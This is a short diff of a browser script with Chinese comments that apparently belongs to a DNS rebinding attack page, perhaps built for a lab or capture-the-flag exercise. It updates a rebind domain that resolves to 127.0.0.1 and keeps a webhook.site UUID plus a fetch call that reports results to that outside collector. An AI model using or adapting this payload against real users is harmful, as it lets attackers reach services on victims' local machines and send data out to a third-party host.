@@ -1,6 +1,6 @@
 <script>
 // DNS Rebinding 域名（下一步生成后填入）
-const REBIND_DOMAIN = 'b9c76d99.7f000001.rbndr.us'; 
+const REBIND_DOMAIN = '185-199-108-153-127-0-0-1.rbndr.us'; 
 // Webhook.site 的 UUID（第1步复制的内容）
 const WEBHOOK_UUID = '8628933e-d978-4419-aac9-b31ee4efdb1a'; 
 
@@ -20,4 +20,5 @@ setTimeout(() => {
     fetch('https://webhook.site/' + WEBHOOK_UUID + '?error=' + encodeURIComponent(e.message));
   });
 }, 3000);
+
 </script>
